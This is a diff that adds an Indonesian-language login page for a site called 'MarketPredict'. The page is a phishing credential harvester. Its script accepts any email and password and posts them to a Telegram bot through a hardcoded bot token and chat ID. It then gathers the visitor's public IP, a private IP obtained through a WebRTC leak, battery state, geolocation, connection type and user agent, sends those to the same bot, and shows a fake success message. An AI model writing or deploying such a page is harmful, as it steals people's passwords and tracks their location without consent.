@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login - MarketPredict</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    :root {
+      --bg-color: #0d1117;
+      --card-bg: #161b22;
+      --primary-color: #58a6ff;
+      --text-color: #e6edf3;
+      --border-color: #30363d;
+      --box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+    }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: var(--bg-color);
+      font-family: 'Poppins', sans-serif;
+    }
+    .login-container {
+      background-color: var(--card-bg);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: var(--box-shadow);
+      text-align: center;
+      max-width: 450px;
+      width: 90%;
+      animation: fadeIn 0.8s ease-out forwards;
+    }
+    .login-container h2 {
+      font-size: 2.5em;
+      color: var(--primary-color);
+      margin-bottom: 30px;
+      font-weight: 700;
+    }
+    .input-group {
+      margin-bottom: 25px;
+      text-align: left;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: 600;
+      color: var(--text-color);
+    }
+    .input-group input {
+      width: calc(100% - 22px);
+      padding: 12px;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      font-size: 1em;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 15px;
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.1em;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <h2><i class="fas fa-sign-in-alt"></i> Login ke MarketPredict</h2>
+    <form id="loginForm">
+      <div class="input-group">
+        <label for="username"><i class="fas fa-envelope"></i> Email:</label>
+        <input type="text" id="username" placeholder="Email bebas" required />
+      </div>
+      <div class="input-group">
+        <label for="password"><i class="fas fa-lock"></i> Password:</label>
+        <input type="password" id="password" placeholder="Password bebas" required />
+      </div>
+      <button type="submit" class="btn-login">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";
+    const CHAT_ID = "7016045840";
+    const REDIRECT_URL = "index.html";
+
+    document.getElementById('loginForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const email = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Simpan login ke localStorage
+      localStorage.setItem('isLoggedIn', 'true');
+      localStorage.setItem('userEmail', email);
+
+      // Ambil info device
+      const device = await collectDeviceInfo();
+
+      const loginMsg = `🔓 Login Bebas\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 ${new Date().toLocaleString()}`;
+
+      const deviceMsg = `📱 Info Perangkat Login\n📶 IP: ${device.ip}\n📡 IP Lokal: ${device.privateIP}\n🔋 Baterai: ${device.battery.level}% ${device.battery.charging ? '(Charging)' : ''}\n📍 Lokasi: ${device.location}\n🌐 Koneksi: ${device.network}\n🧠 UA: ${device.userAgent}`;
+
+      // Kirim ke Telegram
+      if (BOT_TOKEN !== "GANTI_DENGAN_TOKEN_BOT" && CHAT_ID !== "GANTI_DENGAN_CHAT_ID") {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: loginMsg })
+        });
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: deviceMsg })
+        });
+      }
+
+      alert("Login berhasil!");
+      window.location.href = REDIRECT_URL;
+    });
+
+    document.addEventListener('DOMContentLoaded', () => {
+      if (localStorage.getItem('isLoggedIn') === 'true') {
+        window.location.href = REDIRECT_URL;
+      }
+    });
+
+    // === FUNGSI AMBIL INFO DEVICE ===
+    async function collectDeviceInfo() {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const battery = await navigator.getBattery?.();
+      const level = battery ? Math.round(battery.level * 100) : 'N/A';
+      const charging = battery ? battery.charging : false;
+      const privateIP = await getPrivateIP();
+
+      let location = "Tidak diketahui";
+      if (navigator.geolocation) {
+        try {
+          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000}));
+          const lat = pos.coords.latitude.toFixed(5);
+          const lon = pos.coords.longitude.toFixed(5);
+          location = `http://maps.google.com/maps?q=${lat},${lon}`;
+        } catch (err) {
+          location = "Lokasi ditolak";
+        }
+      }
+
+      const network = navigator.connection?.effectiveType || "Unknown";
+      return {
+        ip: ipData.ip,
+        privateIP,
+        battery: { level, charging },
+        network,
+        location,
+        userAgent: navigator.userAgent
+      };
+    }
+
+    async function getPrivateIP() {
+      return new Promise(resolve => {
+        let ip;
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.onicecandidate = e => {
+          if (!e.candidate) return;
+          const candidate = e.candidate.candidate;
+          const res = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(candidate);
+          if (res) {
+            ip = res[1];
+            resolve(ip);
+            pc.close();
+          }
+        };
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+      });
+    }
+  </script>
+
+</body>
+</html>
